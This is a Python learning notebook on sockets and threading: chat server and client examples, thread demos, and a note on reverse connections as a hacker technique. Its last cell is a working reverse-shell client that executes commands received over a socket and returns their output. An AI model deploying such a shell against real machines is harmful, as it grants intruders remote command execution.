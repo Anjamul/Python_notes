{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Socket is a way of communication between two Network status System\n"
     ]
    }
   ],
   "source": [
    "print(\"Socket is a way of communication between two Network status System\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "192.168.43.195\n",
      "DESKTOP-I4RJQEB\n",
      "('DESKTOP-I4RJQEB', [], ['192.168.43.195'])\n"
     ]
    }
   ],
   "source": [
    "hostname=socket.gethostname()\n",
    "hostIP=socket.gethostbyname(hostname)\n",
    "addr=socket.gethostbyaddr(hostIP)\n",
    "print(hostIP)\n",
    "print(hostname)\n",
    "print(addr)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['AF_APPLETALK', 'AF_DECnet', 'AF_INET', 'AF_INET6', 'AF_IPX', 'AF_IRDA', 'AF_SNA', 'AF_UNSPEC', 'AI_ADDRCONFIG', 'AI_ALL', 'AI_CANONNAME', 'AI_NUMERICHOST', 'AI_NUMERICSERV', 'AI_PASSIVE', 'AI_V4MAPPED', 'AddressFamily', 'AddressInfo', 'CAPI', 'EAGAIN', 'EAI_AGAIN', 'EAI_BADFLAGS', 'EAI_FAIL', 'EAI_FAMILY', 'EAI_MEMORY', 'EAI_NODATA', 'EAI_NONAME', 'EAI_SERVICE', 'EAI_SOCKTYPE', 'EBADF', 'EWOULDBLOCK', 'INADDR_ALLHOSTS_GROUP', 'INADDR_ANY', 'INADDR_BROADCAST', 'INADDR_LOOPBACK', 'INADDR_MAX_LOCAL_GROUP', 'INADDR_NONE', 'INADDR_UNSPEC_GROUP', 'IPPORT_RESERVED', 'IPPORT_USERRESERVED', 'IPPROTO_ICMP', 'IPPROTO_IP', 'IPPROTO_RAW', 'IPPROTO_TCP', 'IPPROTO_UDP', 'IPV6_CHECKSUM', 'IPV6_DONTFRAG', 'IPV6_HOPLIMIT', 'IPV6_HOPOPTS', 'IPV6_JOIN_GROUP', 'IPV6_LEAVE_GROUP', 'IPV6_MULTICAST_HOPS', 'IPV6_MULTICAST_IF', 'IPV6_MULTICAST_LOOP', 'IPV6_PKTINFO', 'IPV6_RECVRTHDR', 'IPV6_RECVTCLASS', 'IPV6_RTHDR', 'IPV6_TCLASS', 'IPV6_UNICAST_HOPS', 'IPV6_V6ONLY', 'IP_ADD_MEMBERSHIP', 'IP_DROP_MEMBERSHIP', 'IP_HDRINCL', 'IP_MULTICAST_IF', 'IP_MULTICAST_LOOP', 'IP_MULTICAST_TTL', 'IP_OPTIONS', 'IP_RECVDSTADDR', 'IP_TOS', 'IP_TTL', 'IntEnum', 'IntFlag', 'MSG_BCAST', 'MSG_CTRUNC', 'MSG_DONTROUTE', 'MSG_MCAST', 'MSG_OOB', 'MSG_PEEK', 'MSG_TRUNC', 'MSG_WAITALL', 'MsgFlag', 'NI_DGRAM', 'NI_MAXHOST', 'NI_MAXSERV', 'NI_NAMEREQD', 'NI_NOFQDN', 'NI_NUMERICHOST', 'NI_NUMERICSERV', 'RCVALL_MAX', 'RCVALL_OFF', 'RCVALL_ON', 'RCVALL_SOCKETLEVELONLY', 'SHUT_RD', 'SHUT_RDWR', 'SHUT_WR', 'SIO_KEEPALIVE_VALS', 'SIO_LOOPBACK_FAST_PATH', 'SIO_RCVALL', 'SOCK_DGRAM', 'SOCK_RAW', 'SOCK_RDM', 'SOCK_SEQPACKET', 'SOCK_STREAM', 'SOL_IP', 'SOL_SOCKET', 'SOL_TCP', 'SOL_UDP', 'SOMAXCONN', 'SO_ACCEPTCONN', 'SO_BROADCAST', 'SO_DEBUG', 'SO_DONTROUTE', 'SO_ERROR', 'SO_EXCLUSIVEADDRUSE', 'SO_KEEPALIVE', 'SO_LINGER', 'SO_OOBINLINE', 'SO_RCVBUF', 'SO_RCVLOWAT', 'SO_RCVTIMEO', 'SO_REUSEADDR', 'SO_SNDBUF', 'SO_SNDLOWAT', 'SO_SNDTIMEO', 'SO_TYPE', 'SO_USELOOPBACK', 'SocketIO', 'SocketKind', 'SocketType', 'TCP_FASTOPEN', 'TCP_KEEPCNT', 'TCP_MAXSEG', 'TCP_NODELAY', '_GLOBAL_DEFAULT_TIMEOUT', '_GiveupOnSendfile', '_LOCALHOST', '_LOCALHOST_V6', '__all__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '_blocking_errnos', '_intenum_converter', '_realsocket', '_socket', 'create_connection', 'dup', 'errno', 'error', 'errorTab', 'fromfd', 'fromshare', 'gaierror', 'getaddrinfo', 'getdefaulttimeout', 'getfqdn', 'gethostbyaddr', 'gethostbyname', 'gethostbyname_ex', 'gethostname', 'getnameinfo', 'getprotobyname', 'getservbyname', 'getservbyport', 'has_ipv6', 'herror', 'htonl', 'htons', 'inet_aton', 'inet_ntoa', 'inet_ntop', 'inet_pton', 'io', 'ntohl', 'ntohs', 'os', 'selectors', 'setdefaulttimeout', 'socket', 'socketpair', 'sys', 'timeout']\n"
     ]
    }
   ],
   "source": [
    "print(dir(socket))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "ip=socket.gethostbyname('facebook.com')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'31.13.79.35'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "host=\"192.168.43.195\"\n",
    "port=1234\n",
    "server.bind((host,port))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "server.listen()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Connection establish successfuly from ('192.168.43.195', 58690) with client socket <socket.socket fd=440, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('192.168.43.195', 1234), raddr=('192.168.43.195', 58690)>\n",
      "Client ------>Hello World I am a socket Client\n"
     ]
    }
   ],
   "source": [
    "client,addr = server.accept()\n",
    "print(f\"Connection establish successfuly from {addr} with client socket {client}\")\n",
    "client.send(b\"Welcome Client to server: \")\n",
    "msg=client.recv(1024)\n",
    "print(f\"Client ------>{msg.decode()}\")\n",
    "server.close()\n",
    "client.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "\n",
    "server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n",
    "\n",
    "host = socket.gethostbyname(socket.gethostname())\n",
    "\n",
    "port = 123\n",
    "\n",
    "server_socket.connect((host,port))\n",
    "\n",
    "while True : \n",
    "\n",
    "    c_msg = server_socket.recv(1024)\n",
    "\n",
    "    print(\"\\t\\t\\tserver->\",c_msg.decode())\n",
    "\n",
    "    if c_msg.decode().strip().lower() == 'bye' :\n",
    "\n",
    "        print(\"Connection Closed by Server\")\n",
    "\n",
    "        server_socket.close()\n",
    "\n",
    "        break\n",
    "\n",
    "    msg = input(\"\\nclient->\")\n",
    "\n",
    "    server_socket.send(msg.encode())\n",
    "\n",
    "    if msg.strip().lower() == 'bye' : \n",
    "\n",
    "        server_socket.send(msg.encode())\n",
    "\n",
    "        print(\"Connection is closed by client\")\n",
    "\n",
    "        server_socket.close()\n",
    "\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Threading\n",
    "import threading "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "def hello():\n",
    "    for var in range(20):\n",
    "        print(\"Hlello world times\",var)\n",
    "        time.sleep(0.2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def bye():\n",
    "    for var in range(20):\n",
    "        print(\"Hello world bye times: \",var)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hlello world times 0\n",
      "Hlello world times 1\n",
      "Hlello world times 2\n",
      "Hlello world times 3\n",
      "Hlello world times 4\n",
      "Hlello world times 5\n",
      "Hlello world times 6\n",
      "Hlello world times 7\n",
      "Hlello world times 8\n",
      "Hlello world times 9\n",
      "Hlello world times 10\n",
      "Hlello world times 11\n",
      "Hlello world times 12\n",
      "Hlello world times 13\n",
      "Hlello world times 14\n",
      "Hlello world times 15\n",
      "Hlello world times 16\n",
      "Hlello world times 17\n",
      "Hlello world times 18\n",
      "Hlello world times 19\n"
     ]
    }
   ],
   "source": [
    "hello()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hello world bye times:  0\n",
      "Hello world bye times:  1\n",
      "Hello world bye times:  2\n",
      "Hello world bye times:  3\n",
      "Hello world bye times:  4\n",
      "Hello world bye times:  5\n",
      "Hello world bye times:  6\n",
      "Hello world bye times:  7\n",
      "Hello world bye times:  8\n",
      "Hello world bye times:  9\n",
      "Hello world bye times:  10\n",
      "Hello world bye times:  11\n",
      "Hello world bye times:  12\n",
      "Hello world bye times:  13\n",
      "Hello world bye times:  14\n",
      "Hello world bye times:  15\n",
      "Hello world bye times:  16\n",
      "Hello world bye times:  17\n",
      "Hello world bye times:  18\n",
      "Hello world bye times:  19\n"
     ]
    }
   ],
   "source": [
    "bye()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "th1=threading.Thread(target=hello,args=())\n",
    "th2=threading.Thread(target=bye,args=())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hlello world times 0\n",
      "Hello world bye times:  0\n",
      "Hello world bye times:  1\n",
      "Hello world bye times:  2\n",
      "Hello world bye times:  3\n",
      "Hello world bye times:  4\n",
      "Hello world bye times:  5\n",
      "Hello world bye times:  6\n",
      "Hello world bye times:  7\n",
      "Hello world bye times:  8\n",
      "Hello world bye times:  9\n",
      "Hello world bye times:  10\n",
      "Hello world bye times:  11\n",
      "Hello world bye times:  12\n",
      "Hello world bye times:  13\n",
      "Hello world bye times:  14\n",
      "Hello world bye times:  15\n",
      "Hello world bye times:  16\n",
      "Hello world bye times:  17\n",
      "Hello world bye times:  18\n",
      "Hello world bye times:  19\n",
      "Hlello world times 1\n",
      "Hlello world times 2\n",
      "Hlello world times 3\n",
      "Hlello world times 4\n",
      "Hlello world times 5\n",
      "Hlello world times 6\n",
      "Hlello world times 7\n",
      "Hlello world times 8\n",
      "Hlello world times 9\n",
      "Hlello world times 10\n",
      "Hlello world times 11\n",
      "Hlello world times 12\n",
      "Hlello world times 13\n",
      "Hlello world times 14\n",
      "Hlello world times 15\n",
      "Hlello world times 16\n",
      "Hlello world times 17\n",
      "Hlello world times 18\n",
      "Hlello world times 19\n"
     ]
    }
   ],
   "source": [
    "th1.start()\n",
    "th2.start()\n",
    "th1.join()\n",
    "th2.join()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Socket Programming"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "Socket is a end point of two way communication by which two computer connects with the network and communicate with each other. There are several types of connection exist for example \n",
    "1. Direct connection\n",
    "2. Reverse Connection\n",
    "\n",
    "1. Direct Connection: Direct connection is the type of connection in which server send request to the client to connect with the\n",
    "                        server. as we know to establish connection we required ip and port of the client machine, if client accept our request then connection will be establish successfully. this type of connection is known as the direct connection.\n",
    "       \n",
    "2. Reverse Connection: This type of connection is generally used by the Hackers because nobody will give his IP to unauthorised access. in this situation hackers used a method in which they create a reverse shell scripting in python or any other language. this script contains the socket programming. once the file is send to the client machine it will run on background and send request to the server to connect with the client machine.\n",
    "\n",
    "## Something About IP:\n",
    "There are two types of IP\n",
    "1. Public IP: By using this IP Anyone can access our System.\n",
    "2. Private IP: This is the ip which is provided by the router or our operator.\n",
    "\n",
    "these ip can be furthur classified as the \n",
    "1. Dynamic IP: Dynamic IP is variable and it always change with the connection or system restart.\n",
    "2. Static IP: it's always remain same for a system.\n",
    "\n",
    "for the socket programming We need static IP rather than dynamic ip because of dynamic is variable, but we can also work with dynamic ip which is not prefered.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "192.168.225.35\n",
      "Server is waiting for the Client Request.....\n",
      "Request is Accepted from the... \n",
      "Client socket :  <socket.socket fd=416, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('192.168.225.35', 9999), raddr=('192.168.225.35', 52215)>\n",
      "Client Address :  ('192.168.225.35', 52215)\n",
      "\n",
      "Server ---> bye\n",
      "Connection is closed by the Server.\n"
     ]
    }
   ],
   "source": [
    "my_ip=\"192.168.225.35\"\n",
    "print(my_ip)\n",
    "# create Socket\n",
    "server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n",
    "port=9999\n",
    "server_socket.bind((my_ip,port))\n",
    "server_socket.listen(2)\n",
    "print(\"Server is waiting for the Client Request.....\")\n",
    "client_socket,clientaddr=server_socket.accept()\n",
    "print(\"Request is Accepted from the... \")\n",
    "print(\"Client socket : \",client_socket)\n",
    "print(\"Client Address : \",clientaddr)\n",
    "while True:\n",
    "    msg=input(\"\\nServer ---> \")\n",
    "    if msg.strip().lower() == 'bye' or msg.strip().lower() == \"good night\":\n",
    "        client_socket.send(msg.encode())\n",
    "        print(\"Connection is closed by the Server.\")\n",
    "        client_socket.close()\n",
    "        server_socket.close()\n",
    "        break\n",
    "    client_socket.send(msg.encode())\n",
    "    c_msg=client_socket.recv(1024)\n",
    "    print(\"\\t\\tClient ---> \",c_msg.decode())\n",
    "    if c_msg.decode().strip().lower() == 'bye' or c_msg.decode().strip().lower() == 'good night':\n",
    "        print(\"\\t\\tClient ---> \",c_msg.decode())\n",
    "        print(\"Connection Close by the Client Machine: \",clientaddr)\n",
    "        client_socket.close()\n",
    "        server_socket.close()\n",
    "        break\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "###  Threading"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "hello\n",
      "hello\n",
      "hello\n",
      "hello\n",
      "hello\n",
      "Hii\n",
      "Hii\n",
      "Hii\n",
      "Hii\n",
      "Hii\n"
     ]
    }
   ],
   "source": [
    "class hello:\n",
    "    def run(self):\n",
    "        for i in range(5):\n",
    "            print(\"hello\")\n",
    "class hii:\n",
    "    def run(self):\n",
    "        for i in range(5):\n",
    "            print(\"Hii\")\n",
    "t1=hello()\n",
    "t2=hii()\n",
    "\n",
    "t1.run()\n",
    "t2.run()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hello\n",
      "Hii\n",
      "\n",
      "\n",
      "Hello\n",
      "\n",
      "Hii\n",
      "\n",
      "Hello\n",
      "\n",
      "Hii\n",
      "\n",
      "Hello\n",
      "\n",
      "Hii\n",
      "\n",
      "Hello\n",
      "\n",
      "Hii\n",
      "\n",
      "Hello\n",
      "\n",
      "Hii\n",
      "\n",
      "Hello\n",
      "\n",
      "Hii\n",
      "\n",
      "Hello\n",
      "\n",
      "Hii\n",
      "\n",
      "Hello\n",
      "\n",
      "Hii\n",
      "\n",
      "Hello\n",
      "\n",
      "Hii\n",
      "\n",
      "bye\n"
     ]
    }
   ],
   "source": [
    "# Let's run with the thread each process will run simultaneously.\n",
    "from threading import *\n",
    "import time\n",
    "\n",
    "class hello(Thread):\n",
    "    def run(self):\n",
    "        for i in range(10):\n",
    "            print(\"Hello\\n\")\n",
    "            time.sleep(0.5)\n",
    "class hii(Thread):\n",
    "    def run(self):\n",
    "        for i in range(10):\n",
    "            print(\"Hii\\n\")\n",
    "            time.sleep(0.5)\n",
    "\n",
    "t1=hello()\n",
    "t2=hii()\n",
    "\n",
    "t1.start()\n",
    "time.sleep(0)\n",
    "t2.start()\n",
    "\n",
    "t1.join()\n",
    "t2.join()\n",
    "print(\"bye\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Volume in drive G has no label.\r\n",
      " Volume Serial Number is 76B3-8996\r\n",
      "\r\n",
      " Directory of G:\\My jupyterNote for python\r\n",
      "\r\n",
      "21/02/2019  11:48 PM    <DIR>          .\r\n",
      "21/02/2019  11:48 PM    <DIR>          ..\r\n",
      "21/02/2019  10:00 PM    <DIR>          .ipynb_checkpoints\r\n",
      "20/02/2019  12:47 AM             2,092 client.ipynb\r\n",
      "20/02/2019  09:01 AM               555 datascience firstclassssss....ipynb\r\n",
      "18/02/2019  06:00 PM            28,231 File Handling.ipynb\r\n",
      "18/02/2019  01:26 PM            74,855 File_Handling.ipynb\r\n",
      "14/02/2019  06:06 PM           280,835 Functions.html\r\n",
      "17/02/2019  10:08 PM            22,205 Functions.ipynb\r\n",
      "20/02/2019  09:07 AM            18,137 Iterators and generators.ipynb\r\n",
      "18/02/2019  09:54 PM             6,359 Oops(Class and Objects).ipynb\r\n",
      "18/02/2019  07:20 PM            28,189 Oops2.ipynb\r\n",
      "21/02/2019  11:48 PM            21,017 Socket Programming.ipynb\r\n",
      "21/02/2019  09:52 AM             4,840 Statistics.ipynb\r\n",
      "15/02/2019  09:34 PM               111 STL.cpp\r\n",
      "21/02/2019  11:47 PM            16,840 sys,OS module and shutil.ipynb\r\n",
      "20/02/2019  09:38 PM             1,801 Untitled.ipynb\r\n",
      "              14 File(s)        506,067 bytes\r\n",
      "               3 Dir(s)  205,340,712,960 bytes free\r\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import socket\n",
    "import subprocess\n",
    "\n",
    "\n",
    "#creating host\n",
    "host=\"192.168.225.35\"\n",
    "port=9999\n",
    "\n",
    "#creating Socket\n",
    "server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n",
    "\n",
    "#connecting with the server\n",
    "server_socket.connect((host,port))\n",
    "\n",
    "while True:\n",
    "    data=server_socket.recv(1024)\n",
    "    if data[:2].decode()=='cd':\n",
    "        os.chdir(data[3:].decode())\n",
    "    if len(data)>0:\n",
    "        cmd = subprocess.Popen(data.decode(),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)\n",
    "        output_byte = cmd.stdout.read()+cmd.stderr.read()\n",
    "        output_str = output_byte.decode()\n",
    "        output_str=output_str+\"\\n\"+os.getcwd()+\"> \"\n",
    "        server_socket.send(output_str.encode())\n",
    "        print(output_str)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
